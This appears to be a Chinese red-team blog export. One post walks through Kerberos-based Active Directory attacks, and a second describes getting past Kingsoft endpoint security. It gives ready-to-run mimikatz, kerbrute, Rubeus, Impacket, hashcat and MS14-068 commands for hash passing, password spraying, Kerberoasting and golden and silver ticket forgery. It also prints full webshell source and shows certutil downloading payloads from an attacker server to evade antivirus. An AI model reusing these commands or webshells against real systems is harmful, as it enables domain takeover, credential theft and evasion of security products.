KDC服务会默认安装在一个域的域控中，所以可以直接理解为，AD与KDC均为域控制器,KDC服务框架中包含一个KRBTGT账户，它是在创建域时系统自动创建的一个账号。 kerberos认证协议原理流程 Kerberos认证过程如下图所示 下面讲一下详细的认证步骤，大概分为三个阶段： AS_REQ &amp; AS_REP TGS_REQ &amp; TGS_REP AP-REQ &amp; AP-REP 其中：KDC中有AS认证服务与TGS认证服务 CLient向KDC的AS认证服务请求TGT票据，此处是AS_REQ流程 认证通过后返回 TGT 给 Client，Client 得到 KDC发放的TGT（Ticket Granting Ticket）票据。此处是AS_REP流程 Client 继续拿着 TGT票据 请求 DC 访问 Server，TGS 通过 Client 消息中的 TGT票据请求ST的服务票据（Service Ticket）。此处是TGS_REQ流程 Client通过了TGS认证服务后，TGS将会发放ST服务票据给Client。此处是TGS_REP流程。 Client 得到 ST票据 后，再去向Server请求服务。此处是AP-REQ流程。 server拿到PAC询问KDC，client是否有权限访问资源 KDC将clinet的权限信息发送给server server根据KDC返回的权限信息做对比，判断client是否有权限访问该服务，并把结果返回给client。此处是AP_REP流程。 注：（6）（7）两步不一定发生，需要将目标主机配置为验证KDC PAC验证。 域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的,因此只要我们拿到了krbtgt的密码Hash,就可以随意伪造Ticket,进而使用Ticket登陆域控制器,使用krbtgt用户hash生成的票据被称为Golden Ticket,此类攻击方法被称为票据传递攻击。 AS_REQ &amp; AS_REP分析 分析AS-REQ的数据包 AS-REQ：当某个域用户试图访问域中的某个服务，于是输入用户名和密码，本机Kerberos服务会向KDC的AS认证服务发送一个AS-REQ认证请求。该请求包中包含：请求用户名，客户端主机名，加密类型和Autherticator(用户NTLM Hash加密的时间戳)以及一些信息。 Client向KDC发起AS_REQ请求凭据是用户hash加密的时间戳。请求凭据放在PA_DATA里面。 我们这里直接抓包来看，让域内机器user1使用用户test来登录。 1.AS-REQ AS获取用户名之后，获取对应的ntlm值，通过加密的方法加密数据信息，并且验证时间戳，之后生成随机字符串Session Key，使用用户的ntlm值加密Session Key，使用krbtgt用户的ntlm加密Session Key和客户端信息，一起返回客户端 Send=user_NTML_Hash(Session Key)+krbtgt_NTML_Hash(Session Key+client_info1)[TGT] AS-REQ存在俩种包 一种是不存在pA-ENC-TIMESTAMP字段的，另外一种是前面存在密码字段的 2.AS-REQ不同的包 用户名和密码正确的包 AS-REP：Client发送AS_REQ，请求凭据是用户 hash加密的时间戳。请求凭据放在PA_DATA里面。 当KDC中的AS认证服务收到后，在AS服务器中有用户hash，使用用户hash进行解密，获得时间戳 ，如果 解密成功，并且时间戳在五分钟之内 ，那么 预认证通过 。接着AS认证服务将会向Client发送响应包，响应包中包括krbtgt用户的NTML hash加密后的TGT票据以及用户NTML Hash加密的Login Session key和其他信息。 ticket中的enc-part是由krbtgt的密码hash加密生成的。如果我们拥有krbtgt的hash，便可以自制ticket，发起黄金票据攻击 Login Session Key使用用户NTML Hash加密，作用是用于是用于确保客户端和KDC下一阶段之间通信安全，作为下一阶段的认证密钥 在这一阶段，Client与KDC之间的交互在于AS认证服务，主要是为了获得TGT认证票据，以及Login Session Key，经过该阶段后，Client将会使用自身密码的NTML hash解密Login Session Key得到原始的Login Session Key。然后它会在本地缓存TGT票据和原始Login Session Key。 用户名不正确的包 用户名正确的包 密码不正确的包 AS-REQ流程的的攻击面 通过上面的抓包分析可以得出： 1.HASH传递 2.域内用户枚举 3.密码喷洒 HASH传递攻击方法 在AS-REQ阶段，是用用户密码Hash加密的Authenticator，所以也就造成了hash传递。 mimikatz进行hash传递 这里mimikatz获取hash导出到log日志中，命令如下 mimikatz log privilege::debug sekurlsa::ekeys 抓取administrator的ntlm哈希 privilege::debug ​ sekurlsa::logonpasswords 执行传递 sekurlsa::pth /user:administrator /domain:192.168.10.5 /ntlm:7c64e7ebf46b9515c56b2dd522d21c1c KB2871997补丁的传递方法 安装KB2871997这个补丁之后，只能用管理员账户进行pass hash PTK（pass the key） 获取aes-key: privilege::debug ​ sekurlsa::ekeys 注入aes-key: sekurlsa::pth /user:Administrator /domain:Drunkmars.com /aes256:cf5dba161f3a3dc89454742ff5db89980d6b07e771048b30006546e81d1d79e2 域内用户枚举 AS-REQ 的 cname 值，当用户不存在时，返回包提示错误，所以造成了改攻击方式。 攻击方法 使用kerbrute工具： https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe 前提需要DC需要开启kerberos 88端口 使用以下命令 kerbrute_windows_amd64.exe userenum --dc 192.168.10.5 -d Drunkmars.com user.txt user.txt是用户名的字典 成功爆出用户名。 原理： 使用kerbrute进行错误枚举的原理就是kerberos有三种错误代码： KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证（启用） KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销（禁用） KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端（不存在） 在DC抓包可以看到有4个UNKNOWN，1个REQUIRED，证明有这个用户名存在 密码喷洒 并且当用户名存在，密码正确和错误时，返回包也不一样，所以可以进行用户名密码爆破。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率 使用以下命令 kerbrute_windows_amd64.exe passwordspray --dc 192.168.10.5 -d Drunkmars.com user.txt Fcb0519.. 原理： 密码同样存在三种错误代码 KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证（启用） KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销（禁用） KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端（不存在） 同样在DC抓包，有4个UNKNOWN，1个REQUIRED AS-REP数据包 AS-REP：Client发送AS_REQ，请求凭据是用户 hash加密的时间戳。请求凭据放在PA_DATA里面。 当KDC中的AS认证服务收到后，在AS服务器中有用户hash，使用用户hash进行解密，获得时间戳 ，如果 解密成功，并且时间戳在五分钟之内 ，那么 预认证通过 。接着AS认证服务将会向Client发送响应包，响应包中包括krbtgt用户的NTML hash加密后的TGT票据以及 用户NTML Hash加密的Login Session key和其他信息 。 ticket中的enc-part是由krbtgt的密码hash加密生成的。如果我们拥有krbtgt的hash，便可以自制ticket，发起黄金票据攻击 Login Session Key使用用户NTML Hash加密，作用是用于是用于确保客户端和KDC下一阶段之间通信安全，作为下一阶段的认证密钥 在enc-part里面最重要的字段是Login session key，作为下阶段的认证密钥。 AS-REP中最核心的东西就是 Login session-key 和 加密的ticket。正常我们用工具生成的凭据是 .ccache 和 .kirbi 后缀的，用mimikatz，kekeo，rubeus生成的凭据是以 .kirbi 后缀的，impacket 生成的凭据的后缀是 .ccache 。两种票据主要包含的都是Login session-key 和 加密的 ticket，因此可以相互转化。 AS-REP的攻击面 黄金票据 在 AS-REP 阶段，由于返回的 TGT 认购权证是由 krbtgt 用户的密码Hash加密的，因此如果我们拥有 krbtgt 的 hash 就可以自己制作一个TGT认购权证，这就造成了黄金票据攻击 伪造黄金票据的条件： 我们伪造凭证，需要以下信息： 域名 域的SID值 域的KRBTGT账号的HASH 伪造的域管理员用户名 黄金票据攻击实践 收集域信息 netconfig workstation 可以获得域是redtem.com，用户名是YG1。 获得域控的IP也很简单，ping一下即可，或者 nltest/dsgetdc:域名 nltest/dsgetdc:redteam.com 获取到域控IP为192.168.1.2 导出HASH privilege::debug lsadump::dcsync /domain:redteam.com /all /csv 用管理权限使用mimikatz.exe导出用户的krbtgt的hash fb2227f9e9e6c9ad490eb1c2fa6a8625 收集Krbtgt的SID信息 lsadump::dcsync /domain:redteam.com /user:krbtgt 或者 wmic useraccount get name,sid S-1-5-21-767623950-3225260823-3670188588 fb2227f9e9e6c9ad490ebic2fa6a8625 获取到SID和HASH之后就可以伪造票据了，伪造之前先看一下有没有缓存票据 klist /查看票据 klist purge /清除票据 或者 mimitakzt kerberos::purge 利用mimikatz生成黄金票据 mimikatz.exe &quot;kerberos::golden /user:Administrator /domain:redteam.com /sid:S-1-5-21-767623950-3225260823-3670188588 /krbtgt:fb2227f9e9e6c9ad490ebic2fa6a8625 /ticket:qqq.kirbi&quot; exit /admin：伪造的用户名（任意） /domain：域名称 /sid：sid值，注意要去掉最后一个值 -后面的值 /krbtgt：krbtgt的hash值 /ticket：生成的票据名称 或者 kerberos::golden /user:administrator12 /domain:redteam.com /sid:S-1-5-21-767623950-3225260823-3670188588 /krbtgt:fb2227f9e9e6c9ad490eb1c2fa6a8625 /ptt #生成票据并导入 有了票据之后，拿一个域用户来测试一下票据能否正常使用。 查看导入的票据 kerberos::purge kerberos::ptt ticket.kirbi 查询DC机器C盘目录 dir \\\\dc.redteam.com\\c$ dir \\\\计算机名.域名\\c$ DC火绒拦截了IPC，所以没访问成功，关掉后正常，至此，黄金票据利用成功。 TGS_REQ&amp;TGS_REP分析 Client与TGS之间认证使用TGS_REQ&amp;TGS_REP模块 Client在拿到TGT和Login Session Key之后，下一步的认证交互在于 KDC中的TGS认证服务 ，主要目的是为了获取 ST服务票据 ，因为当Client需要访问某服务器中的某服务时，需要 &quot;门票&quot; --ST服务票据 这一阶段，微软引进了两个扩展S4U2SELF和S4U2PROXY。 TGS-REQ数据包分析 该数据包中的主要内容为：客户端信息，Authenticator(Login Session Key加密的时间戳)、TGT认证权证(padata下ap-req下的ticket)以及访问的服务名等。 padata部分： 在padata中有很重要的一部分叫做AP-REQ，这是TGS-REQ中必须有的数据， 这部分会携带AS-REP里面获取到的TGT票据 ， KDC检验TGT票据，如果票据正确，返回ST票据 。 TGS-REQ请求包中的authenticator就是AS-REP响应包返回的Login Session key加密的时间戳 在req-body中 padding:0 kdc-options:用于与KDC约定一些选项设置 realm:域名 sname:这里是要请求的服务 till:到期时间 rebeus和kekeo都是20370913024805Z，可用于作为特征值检验用 nonce:随机生成数 kekeo/mimikatz的nonce为12381973，rubeus的nonce为1818848256,可用于作为特征值检验 用 etype:加密类型 TGS-REP数据包分析 TGS-REP：当TGS收到请求后，将会检查自身是否存在客户端所请求的服务，如果服务存在， 通过krbtgt用户的NTML hash解密TGT并且得到Login Session Key ，通过 Login Session Key解密Authenticator 。 这一系列解密成功的话，将会验证对方的身份，验证时间戳是否在范围内，并且检查TG中的时间戳是否过期，且原始地址是否和TGT中保存的地址相同 完成认证后，TGS生成ST票据（包括客户端信息和原始Server Session key，整个ST服务票据使用该服务的NTML hash加密以及一个 AS-REP返回的Login-Session-Key加密的Server Session Key （也就是最外层enc-part部分)。并且会为该客户端生成ST服务票据。这两个将在响应包中发送给Client。 ST服务票据主要包含两方面的内容：客户端用户信息 和 原始Service Session Key，整个ST服务票据用该服务的NTLM Hash进行加密。最终Service Session Key 和 ST服务票据 发送给客户端。 PS:在这一步中，不论用户是否有权限访问服务，只要TGT解密无误，都将返回ST服务票据。任何一个用户，只要hash正确，就可以请求域内任何一个服务的票据，这也是kerberoasting能利用的原因。 enc-part：这部分是用请求服务的密码Hash加密的。因此如果我们拥有服务的密码Hash，那么我们就可以自己制作一个ST服务票据，这就造成了白银票据攻击。也正因为该票据是用请求服务的密码Hash加密的，所以当我们得到了ST服务票据，可以尝试爆破enc_part，来得到服务的密码Hash。这也就造成了kerberoast攻击。 TGS-REP的攻击面 1.Kerberoast攻击 概念：就是攻击者为了获取目标服务的访问权限，而设法破解Kerberos服务票据并重写它们的过程。这是红队当中非常常见的一种攻击手法，因为它不需要与服务目标服务进行任何交互，并且可以使用合法的活动目录访问来请求和导出可以离线破解的服务票据，以获取到最终的明文密码。之所以出现这种情况，是因为服务票据使用服务帐户的散列（NTLM）进行加密，所以任何域用户都可以从服务转储散列，而无需将shell引入运行该服务的系统中。 攻击者通常会选择那些可能设置了弱密，码破解成功率较高的票据来尝试破解。一旦攻击者成功破解出了票据，他们有时不仅仅获取的只是服务访问权限，如果服务被配置为在高权限下运行，那么整个域都将可能被攻击者拿下。这些票据可以通过考虑多种因素来识别，例如： SPNs绑定到域用户账户 最后一次密码设置（Password last set） 密码过期时间 最后一次登录（Last logon） 具体来说，Kerberoast攻击涉及以下五个步骤： 服务主体名称（SPN）发现 请求服务票据 导出服务票据 破解服务票据 重写服务票据&amp;RAM注入 原理： 知道相关服务的 SPN 后，可以用 SPN 申请一张 ST 票据。在 kerberos 协议的第 4 步，用户会收到由 server 实例的 NTLM hash 加密生成的 ST 票据，加密算法为 RC4-HMAC-MD5，尝试穷举 hash，模拟加密过程，进行破解（注意和银票的区别）。 任何域用户都可以合法的从 AD 中提取服务账号凭据，不需要与服务目标服务进行任何交互，大多数操作都是离线完成，不会触发告警。 服务账号密码未设置过期时间，或者与域普通用户密码相同以及账号权限过高等都是问题。 域内具有 Read servicePrincipalName 和 Write serverPrincipalName 的域用户具有注册 SPN 的权利。 流程： 找到有价值的 SPN（需要满足的条件：该 SPN 注册在域用户帐户下并且域用户账户的权限较高） 请求 TGS 导出 ST 暴力破解 服务票据重写 权限维持 前面没有了解到SPN，所以先了解一下SPN之后再回头来做实践。 SPN 概念： SPN，全名为：Service Principal Names，即“服务主体名称”。它是域中服务的唯一标识，每个Kerberos服务都必须要有一个SPN，服务在加入域时，会自动注册一个SPN。 如果未进行 SPN 注册或注册失败（名称不唯一），则 Windows 安全层无法确定与 SPN 关联的帐户，因而无法使用 Kerberos 身份验证。 格式： SPN的格式为：&lt;service class&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt;，其中service class和host为必需参数。 service class为服务类型名称，你可以使用除“/”之外的任何名称（因为SPN使用它作为分隔符），只需要保证它是唯一的名称，但是一般建议使用通用名称，如“www”，“ldap”等 host为运行服务的主机名，可以使用DNS名（如：os.hacker.com）或NetBIOS名（如：os），但要注意的是因为NetBIOS名可能会在林中不唯一，会导致SPN注册失败。 host为可选参数，同一服务在同一host上运行时，使用此来加以区别。服务仅使用默认端口时（如80），可以省略。 service name为服务实例名称，不太重要，微软有个这样的例子:MyDBService/host1/CN=hrdb,OU=mktg,DC=example,DC=com 一个SPN命名实例：MySQLSvc/os.hacker.com:3306 或 MySQLSvc/hacker等。 分类： 当一个服务的权限为 Local System 或 Network Service，则 SPN 会自动注册在机器帐户下。 当一个服务的权限为一个域用户，则 SPN 需要手动注册在域用户帐户下。 验证： 在 Kerberos 验证第 3 步中，client 向 TGS 发送 TGT 的同时，发送需要访问服务的 SPN；在第 4 步，TGS 会查询对应 SPN 的服务记录，找到服务后开始验证 TGT，最后 TGS 生成对应 SPN 服务的 ST 票据。 查询SPN 对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测。 使用SetSPN Win7和Windows Server2008自带的工具 查看当前域内的所有SPN： setspn.exe -q */* 查看redteam.com域内的所有SPN： setspn.exe -T redteam.com -q */* 实现Kerberoasting攻击的前提 对于kerberos协议认证过程中返回的tgs_reply，在已知加密算法的前提下，我们可以尝试穷举口令。( 服务密码一般默认为弱密码 ) Windows系统通过SPN查询获得服务和服务实例帐户的对应关系 域内的主机都能查询SPN。 域内的任何用户都可以向域内的任何服务请求TGS。 申请ST票据 前面提到过寻找有价值的SPN服务，那么什么是有价值的呢 可以远程连接，高权限 ，因为计算机域帐户不可以远程连接，所以我们目标一般都是域用户。 使用Rubeus工具 https://github.com/GhostPack/Rubeus 这是一个专门针对Kerberos的工具包。 #依赖.net环境 Rubeus.exe kerberoast 将哈希保存为hash.txt文件，放到hashcat的目录下。使用命令 hashcat64.exe -m 13100 hash.txt pass.txt 使用Powershell命令请求 使用微软提供的类KerberosRequestorSecurityToken发起Kerberos请求，申请指定SPN的ST票据。Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据 #请求服务票据 Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;SPN名&quot; #New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/WIN-7.bean.testlab:1433&quot; #列出服务票据 klist 使用mimikatz请求 申请指定SPN的ST票据 #请求服务票据 kerberos::ask /target:MSSQLSvc/WIN-7.bean.testlab:1433 #列出服务票据 kerberos::list #清除所有票据 kerberos::purge 使用Impacket中的GetUserSPNs请求 需要提供域账户密码才能使用，该脚本会直接输出hashcat格式的服务票据，可以直接使用hashcat进行爆破 #GetUserSPNs.exe -request -dc-ip x.x.x.x 域名称/域用户:密碼 GetUserSPNs.exe -request -dc-ip 172.16.1.1 bean.testlab/test:test123456 &gt; r.txt 导出服务票据 查看票据列表可用一些命令： #cmd klist #mimikatz mimikatz.exe &quot;kerberos::list&quot; #MSF load kiwi kerberos_ticket_list 或 load kiwi kiwi_cmd kerberos::lists 导出： #mimikatz 导出后缀为.kirbi mimikatz.exe &quot;kerberos::list /export&quot; &quot;exit&quot; #Empire下的Invoke-Kerberos.ps1 powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat}&quot; 暴力破解 tgsrepcrack.py kerberoast工具包中的tgsrepcrack.py，可直接对mimikatz导出.kirbi文件进行破解 python tgsrepcrack.py pass.txt xx.kirbi tgscrack 下载地址：tgscrack python2 extractServiceTicketParts.py xxx.kirbi &gt; hash.txt go run tgscrack.go -hashfile hash.txt -wordlist pass.txt hashcat 前面好几种导出hash的方式，都可以使用hashcat来爆破 hashcat.exe -m 13100 hash.txt pass.txt 服务票据重写&amp;RAM注入 ST票据使用服务密码的NTLM哈希签名。如果票据散列已被破解，那么可以使用Kerberoast python脚本重写票据。这将允许在服务被访问时模拟任何域用户或伪造账户。此外，提权也是可能的，因为用户可以被添加到诸如域管理员的高权限组中。 python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500 python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512 使用以下Mimikatz命令将新票据重新注入内存，以便通过Kerberos协议对目标服务执行身份验证。 kerberos::ptt PENTESTLAB.kirbi 参考 域渗透-SPN 白银票据 在TGS-REP阶段，TGS_REP里面的ticket的enc-part是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是TGS票据，不需要跟域控打交道，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由KDC颁发TGT，并且在生成伪造的TGT得20分钟内，TGS不会对该TGT的真伪进行效验。如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST，所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。 白银票据的特点 1.白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。 2.黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。 3.大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC 4.攻击者需要服务帐户密码哈希值 5.TGS是伪造的，所以没有和TGT通信，意味着DC从验证过。 6.任何事件日志都在目标服务器上。 白银票据和黄金票据区别 获取的权限不同 金票：伪造的TGT，可以获取任意Kerberos的访问权限 银票：伪造的ST，只能访问指定的服务，如CIFS 认证流程不同 金票：同KDC交互，但不同AS交互 银票：不同KDC交互，直接访问Server 加密方式不同 金票：由krbtgt NTLM Hash 加密 银票：由服务账号 NTLM Hash 加密 白银票据实践 我们伪造凭证，需要以下信息 要伪造的域用户(任意用户或者不存在的用户，这里我们一般填写域管理员账户) 域名 域的SID值(就是域成员SID值去掉最后的一节) 目标服务的FQDN（FQDN：全限定域名，同时带有主机名和域名的名称。如：dc.bean.testlab） 可利用的服务 域服务账户NTLM哈希 只有KDC能制作和查看PAC。 白银票据的服务列表 服务名称 同时需要的服务 WMI HOST、RPCSS PowerShell Remoting HOST、HTTP WinRM HOST、HTTP Scheduled Tasks HOST Windows File Share CIFS LDAP LDAP Windows Remote Server RPCSS、LDAP、CIFS 除上述外目标机器不能开启PAC（特权属性证书）验证，PAC用于客户端和服务端交互阶段用于鉴权，带有签名，如果没有krbtgt的hash以及服务的hash就没办法伪造有效的签名。（MS14-068可绕过） #域控下执行 mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt #也可使用dcsync在其他机器的域管账户下执行，用户填域控的机器名 mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:bean.testlab /user:dc$&quot; &quot;exit&quot; &gt; 1.txt e49051446e697bb3f91bac430da93c3e S-1-5-21-767623950-3225260823-3670188588 伪造CIFS 伪造CIFS权限，CIFS常用于主机之间的文件共享 #mimikatz.exe &quot;kerberos::golden /domain:域名 /sid:域SID /target:目标的FQDN /service:服务类型 /rc4:NTLMHash /user:伪造的用户名 /ptt&quot; mimikatz.exe ”kerberos::golden /domain:redteam.com /sid:S-1-5-21-767623950-3225260823-3670188588 /target:dc.redteam.com /service:cifs /rc4:e49051446e697bb3f91bac430da93c3e /user:administrator /ptt“ * /domain：域名 * /sid ；sid值 * /target：域控制器全称 * /service：需要指定相关的服务名，此处为cifs * /rc4:域控的计算机账户ntlm hash * /user：要伪造的用户名，任意写 dir \\\\dc\\c$ 访问DC成功。 Kerberos协议的各阶段攻击手法 MS14-068域提权 一、漏洞说明 改漏洞可能允许攻击者将未经授权的域用户账户的权限,提权到域管理员的权限。 微软官方解释: https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-068 二、漏洞原理 Kerberos认证原理:https://www.cnblogs.com/huamingao/p/7267423.html 服务票据是客户端直接发送给服务器,并请求服务资源的。如果服务器没有向域控dc验证pac的话,那么客户端可以伪造域管的权限来访问服务器。 三、漏洞利用前提 1.域控没有打MS14-068的补丁 2.攻击者拿下了一台域内的普通计算机,并获得普通域用户以及密码/hash值，以及用户的suid 四、工具下载 Ms14-068.exe 下载地址:https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068 PSexec 下载地址:https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe mimikatz 下载地址:https://github.com/gentilkiwi/mimikatz/releases 五、漏洞利用 如果当前用户为域用户 可以直接用 whoami /user 获取sid 如果不是只是本地用户可以用mimikatz 抓取本地的域用户密码 记住mimikatz要有管理员权限不然无法抓取内存密码，可以以管理员权限运行。 利用ms14-068.exe 工具生成伪造的kerberos协议认证证书 MS14-068.exe -u @ -p -s -d ms-14-068.exe -u 域用户@域控名 -p 域用户密码 -s 域用户sid -d 域ip 利用mimikatz.exe将证书写入，从而提升为域管理员 kerberos::ptc 你的证书名字 kerberos::ptc TGT_zhangsan@ggyao.com.ccache 写入成功后，成功dir域控C盘 使用psexec.exe获取一个交互式shell psexec.exe \\WIN-2008-DC.ggyao.com cmd psexec执行单条命令： psexec.exe \\WIN-2008-DC.ggyao.com cmd /c “ipconfig” 方法2：goldenPac.exe（推荐使用） （https://github.com/maaaaz/impacket-examples-windows） 此工具是impacket工具包里的，它是MS14-068+psexec的组合，因此使用起来非常放方便快捷。 goldenPac.exe ggyao.com/zhangsan:Aatesttest@WIN-2008-DC.ggyao.com 方法3：kekeo.exe （https://github.com/gentilkiwi/kekeo/releases） 通过kekeo.exe获取域控权限，此工具并非每次都能成功利用。 kekeo.exe “exploit::ms14068 /domain:ggyao.com /user:zhangsan /password:Aatesttest /ptt” “exit” 注意事项 1.票据伪造的机器不一定需要在域里，将DNS指向域控，能解析就行。 2.IPC$访问域控的时候需要使用主机名，不能使用IP。 漏洞原理： 其实出现这个问题的关键点在于PAC(特权属性证书:验证用户所拥有的权限) 先大致回顾一下Kerberos的认证流程 域用户登录，向KDC的AS服务发送自身密码加密的时间戳进行预认证； DC的AS服务验证用户密码是否正确。若正确，返回一张TGT票据，该票据为krbtgt密码加密而成； 域用户凭借TGT票据向KDC的TGS服务申请访问某Server服务的票据； 域控的TGS服务验证TGT后，返回给域用户能够访问该Server服务的票据(ST, TGS Ticket)； 域用户拿着ST访问对应的Server服务； 该Server服务验证ST，决定是否允许让域用户访问。 其中，PAC是默认包含在TGT中的； 通常情况下，AS_REQ 请求中如果include-pac被置为 true，只要 AS 服务通过了域用户的认证，则会在返回的 AS_REP 数据包中的 TGT 中加入 PAC 信息； 而如果在 AS_REQ 请求时，include-pac被置为 false，则 AS_REP 返回的 TGT 中就不会包含 PAC 信息。 于是在AS_REP返回的TGT中没有PAC信息后，域用户则可以伪造&quot;恶意&quot;的PAC放入TGS_REQ中，KDC解密PAC后会再次加密到一个新的TGT中并返回给域用户，此时的TGT中已经携带了“恶意”PAC，也就达到漏洞利用的目的。 ","link":"https://redteamblog.icu/post/kerberos/"},{"title":"浅谈bypass金山终端安全系统的心路历程","content":"关于金山终端的bypass心路历程 浅谈bypass金山终端安全系统的心路历程 1.漏洞详情 任意文件下载 /htmltopdf/downfile.php?filename=xxx /conf /.ssh ..... 任意文件上传 2.getshell 遇到几个问题 1.上传任意文件被秒删，只能存活一秒。 2.php的 eval、create_function、base64_decode 等敏感函数被杀，以及函数不能传递任何参数，但system等命令执行函数能执行。 3.无法执行敏感命令操作，比如 net user /add ，ps反弹cs等。 对于第一个问题，虽然只能存活一秒，但是能执行成功，我们可以往其他目录写shell。比如 &lt;?php file_put_contents(&quot;../../xx.php&quot;,'xxxx'); 这样可以解决第一个问题，我们可以写shell到其他目录来bypass。 第二个问题，eval 函数被禁用，不能传递参数，需要传递参数的shell均无法执行。比如冰蝎 &lt;?php @error_reporting(0); session_start(); $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond $_SESSION['k']=$key; session_write_close(); $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded('openssl')) { $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&amp;15]; } } else { $post=openssl_decrypt($post, &quot;AES128&quot;, $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p.&quot;&quot;);}} @call_user_func(new C(),$params); ?&gt; 简单观察一下冰蝎的马，首先是有post传参，然后是 eval 函数，所以pass了。然后我们先观察蚁剑的插件生成的免杀马 &lt;?php class JADE { function aoMy() { $mmaQ = &quot;\\x29&quot; ^ &quot;\\x48&quot;; $kndi = &quot;\\xda&quot; ^ &quot;\\xa9&quot;; $yRpX = &quot;\\xb7&quot; ^ &quot;\\xc4&quot;; $tHGH = &quot;\\x1f&quot; ^ &quot;\\x7a&quot;; $EBzf = &quot;\\x35&quot; ^ &quot;\\x47&quot;; $WFrO = &quot;\\x4b&quot; ^ &quot;\\x3f&quot;; $iGgJ =$mmaQ.$kndi.$yRpX.$tHGH.$EBzf.$WFrO; return $iGgJ; } function __destruct(){ $KUht=$this-&gt;aoMy(); @$KUht($this-&gt;rx); } } $jade = new JADE(); @$jade-&gt;rx = isset($_GET['id'])?base64_decode($_POST['qwq']):$_POST['qwq']; ?&gt; 特征很明显。再来看看蚁剑自带的。 &lt;?php $YCgX=create_function(chr(7560/210).chr(645-530).chr(01674-01515).base64_decode('bQ==').str_rot13('r'),chr(0265370/01630).chr(0324020/01630).str_rot13('n').str_rot13('y').str_rot13('(').str_rot13('$').chr(0252733/01371).chr(01275-01116).str_rot13('z').chr(204-103).base64_decode('KQ==').chr(21948/372)); $YCgX(base64_decode('OTE3M'.'DMwO0'.'BldkF'.'sKCRf'.''.str_rot13('H').base64_decode('RQ==').chr(225-168).chr(01154-01030).chr(0160150/01234).''.''.chr(25410/363).chr(384-268).str_rot13('0').base64_decode('Wg==').base64_decode('WA==').''.'N0XSk'.'7Mjc1'.'MTA5M'.'Ds='.''));?&gt; 通过str_rot13和base64相关的字符串处理函数来进行bypass，但是明显有create_function函数在，也被过滤了，后面猜想企业终端云防护应该收录了这种公开的shell，常规bypass应该绕不过。 经过n多种尝试，发现并不能达成直接连上冰蝎或者蚁剑的要求，转换思路尝试写个没有参数传递的能执行命令的伪shell php无参数rce，ctf多年前的考点，比如。 &lt;?=system(end(getallheaders())); 当时时间紧迫，只是临时构造了个demo，关于无参数rce还有很多形式的方法。 3.获取权限 第二个问题解决了。来到了第三个问题，如何进一步获取主机权限？首先尝试了各种方法。比如 1.远程ps上线（毫无意外的被拦截，应该是云防护拦截的 2.通过net user /add操作添加用户然后3389连，当然这儿已经在内网了，所以可以直接连接。(被拦) 也尝试利用C:\\Windows\\System32\\net1.exe来进行添加，或者通过COPY命令复制net1.exe来绕过防护，比如 COPY C:\\Windows\\System32\\net1.exe C:\\Users\\Public\\test start test user xxx /add 很遗憾被拦截了。 最后经过ping探测，发现出网，决定利用certutil来实现远程下载。比如 certutil -urlcache -split -f http://vps/xxx xxx 简单服务器起个http服务之后发现可以下载。不过当下载exe的时候发现被拦截了。直接改成其他后缀绕过。 后面思路就很明显了，远程下载exe然后直接上线。然后又被拦截了，想着难道还要我做免杀？ 当时已经深夜了，做免杀未免太耗时间，想着添加个管理员用户直接3389连。但是前面的net命令又被禁用了。又来到了熟悉的bypass环节。 使用windows api添加用户 这个方法在去年hw被大家广泛使用。贴个github项目 https://github.com/lengjibo/NetUser 原理在这不做过多阐述，大概就是利用windows自带的接口进行相关操作。最后结果图 4.常见的shellcode免杀 